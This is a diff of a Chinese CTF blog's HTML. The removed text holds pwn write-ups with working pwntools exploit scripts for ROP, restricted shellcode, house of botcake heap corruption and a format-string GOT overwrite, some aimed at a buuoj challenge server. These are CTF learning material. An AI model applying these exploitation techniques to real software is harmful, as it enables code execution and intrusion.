rsi</span></span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(<span class="number">0x40115a</span>)<span class="comment">#first return address</span></span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;c&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x404018</span>)<span class="comment">#third read rsi</span></span><br><span class="line">payload+=<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(<span class="number">0x40115a</span>)<span class="comment">#second return address</span></span><br><span class="line">payload+=<span class="string">b&#x27;s&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=<span class="string">b&#x27;e&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x8</span>)<span class="comment">#third read rdx&amp;eax</span></span><br><span class="line">payload+=<span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(<span class="number">0x40115d</span>)<span class="comment">#fourth return address</span></span><br><span class="line">payload+=<span class="string">b&#x27;i&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=<span class="string">b&#x27;g&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x0</span>)<span class="comment">#will change read rdx to zero</span></span><br><span class="line">payload+=<span class="string">b&#x27;h&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(<span class="number">0x40116d</span>)<span class="comment">#fifth return address</span></span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;t&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x40116D</span>)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(<span class="number">0x401099</span>)<span class="comment">#sixth return address</span></span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;u&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x3b</span>)<span class="comment">#rax</span></span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(<span class="number">0x401141</span>)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;n&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;\x90&#x27;</span>)<span class="comment">#change read real address  #我打本地 read改成syscall末尾改成0x90即可，打buu远程的话，因为那边libc版本原因，应该去改成0xf</span></span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../img/image-20221024201409019.png" alt="image-20221024201409019"></p>
-<h2 id="1-5"><a href="#1-5" class="headerlink" title="1!5!"></a>1!5!</h2><h3 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h3><img src="../img/image-20221024201923989.png" alt="image-20221024201923989" style="zoom:50%;" />
-
-<h3 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h3><img src="../img/image-20221024202003006.png" alt="image-20221024202003006" style="zoom:50%;" />
-
-<p>这题考察的很明显，就是一个单纯的shellcode编写(只能用给出的机器码) ，如果通过检查的话，就将shellcode执行     题目给出的字符如下：</p>
-<img src="../img/image-20221024202220891.png" alt="image-20221024202220891" style="zoom: 67%;" />
-
-
-
-<h3 id="利用思路：-1"><a href="#利用思路：-1" class="headerlink" title="利用思路："></a>利用思路：</h3><p>这道题<code>pop rsi</code> <code>pop rdi</code> <code>syscall</code>等指令都无法使用，我们的思路是去想办法执行一次系统调用read，将数据读到mmap映射出来的区域上，这样第二次用read读的数据就不会受到程序中的check函数限制。</p>
-<p>但问题是如何执行系统调用read？</p>
-<p>举个例子，syscall的机器码是0x0f05。程序虽然无法写入这个0x0f05，但是却可以写入0x4141和0x4e44。而0x4141和0x4e44异或的结果是0x0f05，这样就做出来了0x0f05。</p>
-<blockquote>
-<p>整体思路是先将映射出来的地址0x10000给到rcx寄存器，然后我们通过如下代码,去将异或后的结果写入内存中  先让eax置空，这样去和一组数据异或的时候，就会直接被赋值为那组数据，然后再去和原本地址里的数据进行异或，进行异或后的结果又被放进了内存中。</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor eax,0x31315756</span><br><span class="line">xor dword ptr[rcx+0x50],eax</span><br></pre></td></tr></table></figure>
-
-
-
-<p>现在就考虑怎么做出来pop rsi和pop rdi以及syscall指令。他们的机器码分别为0x5f 0x5e 0x0f05。</p>
-<p>我们需要把这四个字节机器码给分成两批写入，因为0x5f5e需要异或两次做出来，而0x0f05需要异或一次做出来，如果放到一起的话第二次异或，除非我们布置一个0x0000和0x0f05异或，才可以保留0x0f05，否则0x0f05就会被改变。但是我们无法将0x0000输入进去，所以只能两批分开写入。</p>
-<p>我们先将0x5f5e写入到内存里。</p>
-<p>首先我们要考虑最初在0x10000上面写入0x4848(这个0x4848是啥都行，只要能通过检查，我只是最初随意找了个0x4848)。我们最后想让0x5f5e出现在内存里，那就需要去拿0x4848和0x5e5f(由于小端序)去异或一次，得到0x1617，而0x1617我们肯定是输入不进去的，所以还需要再异或一次得到0x1617。这次我找的是0x4141，因此那0x4141和0x1617异或，得到的结果是0x5756，然后发现0x5756可以输入进去。</p>
-<p>因此思路为：先将0x4141写到内存，然后拿0x5756和这段内存异或，此时的内存值为0x1617。我们再拿0x4848和这段内存异或就得到了0x5e5f。</p>
-<img src="../img/image-20221024213005259.png" alt="image-20221024213005259" style="zoom:50%;" />
-
-<img src="../img/image-20221024213207843.png" alt="image-20221024213207843" style="zoom:50%;" />
-
-<img src="../img/image-20221024213320203.png" alt="image-20221024213320203" style="zoom:50%;" />
-
-<p>然后如法炮制构造出来syscall指令。</p>
-<p>因为构造pop rdi和pop rsi指令，就意味着在这之前我们需要压栈参数。观察此时的寄存器状态，我们需要给rsi 0x10000，需要给rdi 0。正好rbx和rcx寄存器满足这个条件，而且我们还能用push rbx push rcx。所以我们在0x10050-0x2的位置写下push rbx和push rcx的机器码。</p>
-<p><img src="/../img/image-20221024213552704.png" alt="image-20221024213552704"></p>
-<p>最后执行系统调用read，把获取shell的shellcode给重新读入一次即可。</p>
-<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p><a href="https://zikh26.github.io/posts/ad411136.html">tools</a></p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0x1324)</span></span><br><span class="line">shellcode=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor eax,0x31315756</span></span><br><span class="line"><span class="string">xor dword ptr[rcx+0x50],eax</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor eax,0x31314848</span></span><br><span class="line"><span class="string">xor dword ptr[rcx+0x50],eax</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor eax,0x3131444e</span></span><br><span class="line"><span class="string">xor dword ptr[rcx+0x52],eax</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p.send((asm(shellcode).ljust(<span class="number">0x50</span>-<span class="number">2</span>,<span class="string">b&#x27;\x58&#x27;</span>)+<span class="string">b&#x27;\x51\x53&#x27;</span>+<span class="string">b&#x27;\x41&#x27;</span>*<span class="number">4</span>).ljust(<span class="number">512</span>,<span class="string">b&#x27;\x58&#x27;</span>))</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x100</span>+shellcode_store(<span class="string">&quot;shell_64&quot;</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="Magic-Book"><a href="#Magic-Book" class="headerlink" title="Magic_Book"></a>Magic_Book</h2><h3 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h3><p>这道题利用的是house of botcake。第一次遇到这个手法，先简单记录一下该手法是如何利用的。</p>
-<p>在2.29以后的glibc版本中加入了key机制，进入tcache bin的堆块会被添加一个key字段(也就是tcache_perthread_struct的地址)，位于chunk的bk位置。如果之后释放堆块准备进入tcache bin的时候，发现堆块的key字段位置已经是tcache_perthread_struct的地址，那就去遍历当前tcache bin，如果发现已经存在了当前堆块，那么就会报出 free(): double free detected in tcache 2的错误。</p>
-<p>而house of botcake的思路是，先将堆块放入unsorted bin中(此处要利用UAF漏洞)，这样避免了key的位置是tcache_perthread_struct的地址。然后我们再次释放该堆块让其进入tcache bin，这样就绕过了检查。完成了double free，让同一个堆块即出现在了unsorted bin中又出现在了tcache bin中。</p>
-<p>举个例子:</p>
-<p>我们先申请七个堆块，准备一会将其释放，去填满tcache bin(如下)</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *p[<span class="number">20</span>];</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">	p[i]=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>然后再申请两个0x100的堆块以及一个防止和top chunk合并的堆块(如下)</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *prev=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="type">void</span> *victim=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br></pre></td></tr></table></figure>
-
-<p>接着将最初的七个堆块全部释放，填满tcache bin(如下)</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">free</span>(p[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>接着我们先去释放位于高地址的victim，它将进入unsorted bin，然后释放位于低地址的prev，它也会进入unsorted bin，而且将与victim合并成一个更大的位于unsorted bin的一个堆块(如下)</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"><span class="built_in">free</span>(prev);</span><br></pre></td></tr></table></figure>
-
-<p>最后我们再申请出来一个0x100的堆块(因为tcache bin具有绝对的优先权，所以这个堆块会从tcache bin里取出来，而此时的tcache bin就只有6个堆块，空出来了一个)，然后我们将victim再释放掉，此时的victim进入tcache bin。这样我们只要从unsorted bin申请出来任意一个大小的堆块(能覆写到victim的fd指针并且大小不为0x100)，就可以打一个tcache poisoning。(如下)</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="保护策略：-2"><a href="#保护策略：-2" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/image-20221025213323159.png" alt="image-20221025213323159"></p>
-<h3 id="程序逻辑："><a href="#程序逻辑：" class="headerlink" title="程序逻辑："></a>程序逻辑：</h3><p>程序没有edit函数和show函数，然后有只能用一次的UAF漏洞。对申请的字节数还有限制，最大为0x100。	</p>
-<h3 id="利用思路：-2"><a href="#利用思路：-2" class="headerlink" title="利用思路："></a>利用思路：</h3><p>这题如果单纯的打house of botcake，那么后续只能打io leak泄露一个堆地址。如果想第二次打tcache poisoning的话，就必须要进行一点布局。</p>
-<p>我们先看一下单纯的io leak用house of botcake是怎么布局的。</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#prev</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#victim</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">9</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"></span><br><span class="line">    uaf(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)<span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;\xa0\x46&#x27;</span>)<span class="comment">#stdout struct</span></span><br><span class="line">    debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1401</span>,<span class="number">0x13e9</span>,<span class="number">0x13f5</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;here&#x27;</span>)</span><br><span class="line">    payload=p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    add(<span class="number">0x100</span>,payload)<span class="comment">#io leak</span></span><br><span class="line">    leak_libc=recv_libc()</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x1ec980</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>上面就是最简单的一个house of botcake的布局，但是需要注意的是在<code>add(0x100,&#39;here&#39;)</code>这行执行的时候，情况如下:</p>
-<p><img src="/../img/image-20221026104029350.png" alt="image-20221026104029350"></p>
-<p>可以看到，我们将要申请的tcache bin的堆块为0x110，而申请出来的时候，是可以控制unsorted bin的size，如果我们将unsorted bin的size改成一个更大的size(让unsorted bin里包含一个tcache bin中的堆块)，这样下次切割unsorted bin的时候，又能够控制里面被包含的那个tcache bin的堆块的fd指针，从而达到第二次的tcache poisoning。</p>
-<p>不过由于2.31的glibc版本中，对unsorted bin的检查较为严格，我们还需要伪造一个size和prev_size来保证unsorted bin在篡改size后依然能通过检查。</p>
-<p>最后需要注意的就是，在第一次tcache poisoning攻击后0x110的链已经无法进行第二次的tcache poisoning了，所以我们需要提前布置一条新的链，便于第二次的tcache poisoning。</p>
-<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h3><p><a href="https://zikh26.github.io/posts/ad411136.html">tools</a></p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice : &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice : &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uaf</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice : &quot;</span>,<span class="built_in">str</span>(<span class="number">9</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#prev</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#victim</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#second tcache poisoning.after the first tcache poisoning,the 0x100 tcache chain will bad</span></span><br><span class="line">    <span class="comment">#so we need to prepare 0x80 tcache chain</span></span><br><span class="line">    payload=p64(<span class="number">0xdeadbeef</span>)*<span class="number">14</span>+p64(<span class="number">0x180</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,payload)<span class="comment">#size and prev_size of unsigned bin to be forged</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"></span><br><span class="line">    uaf(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#take one from tcache bin</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)<span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#let the fd pointer of unsorted bin local tcache bin</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;\xa0\x46&#x27;</span>)<span class="comment">#stdout struct</span></span><br><span class="line">    payload=p64(<span class="number">0xdeadbeef</span>)*<span class="number">18</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x180</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,payload)<span class="comment">#tamper size of unsorted bin</span></span><br><span class="line">    payload=p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    add(<span class="number">0x100</span>,payload)<span class="comment">#io leak</span></span><br><span class="line">    leak_libc=recv_libc()</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x1ec980</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">12</span>)</span><br><span class="line">    delete(<span class="number">2</span>)<span class="comment">#second tcache poisoning</span></span><br><span class="line">    payload=p64(<span class="number">0xdeadbeef</span>)*<span class="number">12</span>+p64(<span class="number">0x70</span>)+p64(<span class="number">0x90</span>)+p64(free_hook)</span><br><span class="line">    add(<span class="number">0xb0</span>,payload)<span class="comment">#Cut a piece of memory from unsorted bin to control the fd pointer of tcache bin </span></span><br><span class="line">    debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1401</span>,<span class="number">0x13e9</span>,<span class="number">0x13f5</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,p64(sys_addr))  </span><br><span class="line">    delete(<span class="number">17</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p,e,libc=load(<span class="string">&quot;heap&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25633&quot;</span>)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
-
-<p><img src="/../img/image-20221026105053790.png" alt="image-20221026105053790"></p>
-<p>最开始复现这题的时候，挺懵的。通过不断调试roderick师傅的exp，渐渐知道了这题的做法(其实是我太菜了，花了一天才弄懂)。不过最后也仅仅是知道了这题的做法和思路，但不明白这个布局是怎么做出来的，于是第二天早上把exp删了，自己重新写了一下这道题，按照自己的思考走了一遍，才彻底明白了为什么要这么布局。</p>
-<p>其实这也说明了在堆的布局上，不能只知其然，更要知其所以然。</p>
-<h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/16822129.html">DASCTF X GFCTF 2022十月挑战赛 pwn wp - LynneHuan - 博客园 (cnblogs.com)</a></p>
-<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1709">奇安信攻防社区-深入理解 House of Botcake 堆利用手法 (butian.net)</a></p>
-
+          <p>这次比赛放了三道pwn，做起来还是蛮吃力的，shellcode那题还是经过师傅们提示才做出来的，R()P这题到比赛结束也没有做出来。通过这次比赛感觉自己对于汇编中的gadget理解和利用还是有写不足，在此写下wp记录一下解题的过程。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/6b7e3e3a.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1259,7 +667,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-10-08 10:24:48" itemprop="dateModified" datetime="2022-10-08T10:24:48+08:00">2022-10-08</time>
+      <time title="修改时间：2023-07-01 19:57:17" itemprop="dateModified" datetime="2023-07-01T19:57:17+08:00">2023-07-01</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1281,119 +689,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="cyberprinter"><a href="#cyberprinter" class="headerlink" title="cyberprinter"></a>cyberprinter</h2><h3 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/2706180-20220919100434467-653241350.png"></p>
-<h3 id="漏洞所在："><a href="#漏洞所在：" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><p><img src="/../img/2706180-20220919100444183-1653075701.png"></p>
-<p>首先是printf函数%s可以泄露一个libc地址(让输入写满)，然后存在一个格式化字符串的洞，但是if进行了一些检查，无法利用%p或者%x来泄露地址，出题人这里仅仅就是想让我们去任意写而非任意读。</p>
-<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>由于程序是系统调用exit退出的，因此无法劫持exit里的结构体指针。</p>
-<p>发现printf执行后，执行了一个puts，考虑去劫持IO里的某些指针。考虑去伪造stdout结构体里的vtable指针，控制其偏移，让__xsputn落在one_gadget上即可。但实际操作的时候发现vtable这个基地址中出现了0x78，结果导致了if判断时被过滤掉了，因此这个思路也断了。</p>
-<p>经过roderick和winmt师傅的提示，这题采用一种新的思路，来劫持libc中的got表。</p>
-<p>本题的libc保护如下：</p>
-<p><img src="/../img/2706180-20220919100457611-1949132916.png"></p>
-<p>可以看见保护是Partial RELRO，这就意味着我们可以篡改其函数的got表。</p>
-<p>而puts函数又调用了strlen函数，也就是在libc中执行puts函数时，又通过strlen函数的got表跳转到了strlen函数。</p>
-<p>我们去劫持strlen函数的got表为one_gadget即可。</p>
-<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p,e,libc=load(<span class="string">&quot;print&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26047&quot;</span>)</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0x13A0,0x13E9)</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Your name?pls..\n&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x1ec5c0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">strlen_addr=libc_base+<span class="number">0x1EB0A8</span><span class="comment">#libc中strlen函数的got表地址</span></span><br><span class="line">one_gadget=search_og(<span class="number">1</span>)+libc_base</span><br><span class="line">log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">payload=fmtstr_payload(offset=<span class="number">8</span>,writes=&#123;strlen_addr:one_gadget&#125;,numbwritten=<span class="number">0</span>, write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;But there is sth wrong in it,so you can&#x27;t do sth&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../img/image-20221007232808150.png" alt="image-20221007232808150"></p>
-<h2 id="appetizer"><a href="#appetizer" class="headerlink" title="appetizer"></a>appetizer</h2><h3 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/image-20221007232818671.png" alt="image-20221007232818671"></p>
-<h3 id="漏洞所在：-1"><a href="#漏洞所在：-1" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><p><img src="/../img/image-20221007232830424.png" alt="image-20221007232830424"></p>
-<p>这里存在一个溢出，虽然不会溢出到返回地址，但是后八个字节决定了下图read是往哪里输入的。</p>
-<p><img src="/../img/image-20221007232842582.png" alt="image-20221007232842582"></p>
-<p><img src="/../img/image-20221007232853757.png" alt="image-20221007232853757"></p>
-<p>上图这里泄露了一个地址，通过这个我们可以拿到程序基地址，而且这个地址也是接下来read往里面输入了0x108字节的地址。</p>
-<h3 id="利用思路：-1"><a href="#利用思路：-1" class="headerlink" title="利用思路："></a>利用思路：</h3><p>其实这道题的意图很明显，出题人应该是想让我们迁移到这里(如下图)，因为这里我们是可以把rop链布置到这里的。</p>
-<p><img src="/../img/image-20221007232903914.png" alt="image-20221007232903914"></p>
-<p>然后去打rop，同时因为禁用了execve，因此最终应该是考虑打orw。</p>
-<p>我们先看看如何迁移到这个地址上。</p>
-<p>首先通过调试，我们发现如果我们在第一次输入里，最后的字节发8个a，那么最后一次的read的buf就会变成一堆a(如下)</p>
-<p><img src="/../img/image-20221007232953300.png" alt="image-20221007232953300"></p>
-<p>这个地址表面上是我们可控的，但是我们没有栈地址，因此其实是控制不了程序的执行流的。不过这里我观察了一下，这个read的buf正常的值(也就是不利用第一次输入的那个溢出)(如下)就是rbp，而正好可以控制rbp的值和返回地址(这也就是我们打栈迁移的条件)</p>
-<p><img src="/../img/image-20221007233119819.png" alt="image-20221007233119819"></p>
-<h4 id="rop链的构建"><a href="#rop链的构建" class="headerlink" title="rop链的构建"></a>rop链的构建</h4><p>然后我们那边的rop链的思路是先泄露libc地址，然后再执行一次read读进来一条新的rop链来打orw。但难点是我们无法控制rdx寄存器，导致read函数用残留的rdx中数据直接读的话，只能读进来16个字节的数据。(而这新读的16个字节数据，就可以使用libc里的gadget地址了)，因此我们使用一个libc里的pop rdx的gadget再执行一次read函数，来读入更多的数据。</p>
-<p>先说第一条链的第一部分（使用write函数进行libc地址的泄露（如下图），不知道为啥我这里用puts泄露不了）</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rop=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(e.got[<span class="string">&#x27;write&#x27;</span>]+base_addr)+p64(<span class="number">0</span>)+p64(e.plt[<span class="string">&#x27;write&#x27;</span>]+base_addr)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../img/image-20221007233132958.png" alt="image-20221007233132958"></p>
-<p>再说第一条链的第二部分（这个部分的意义就是把libc里这个pop rdx的gadget给读到内存里来，这里read函数的第二个参数需要布局一下）（如下图）</p>
